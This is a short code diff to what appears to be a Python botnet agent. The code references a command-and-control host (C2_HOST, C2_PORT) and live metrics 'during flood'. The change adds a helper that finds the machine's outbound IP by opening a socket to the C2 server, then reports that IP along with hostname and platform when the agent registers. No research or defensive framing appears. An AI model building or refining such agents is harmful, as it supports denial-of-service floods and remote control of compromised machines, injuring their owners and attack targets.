@@ -53,6 +53,20 @@ AGENT_ID  = _load_or_create_id()
 HOSTNAME  = socket.gethostname()
 PLATFORM  = platform.system() + " " + platform.release()
 
+def _get_real_ip():
+    """Get the real outbound IP (avoids 127.0.1.1 loopback alias on Linux)."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect((C2_HOST, C2_PORT))  # connects to C2 — picks correct interface
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        try:
+            return socket.gethostbyname(HOSTNAME)
+        except Exception:
+            return "0.0.0.0"
+
 # ── Live metrics (updated in real-time during flood) ─────────────────────────
 _metrics_lock = threading.Lock()
 _metrics = {
@@ -312,7 +326,7 @@ def main():
             "id":           AGENT_ID,
             "hostname":     HOSTNAME,
             "platform":     PLATFORM,
-            "ip":           socket.gethostbyname(HOSTNAME),
+            "ip":           _get_real_ip(),
             "metrics_port": metrics_port or 0,
         })
         if r.get("ok"):
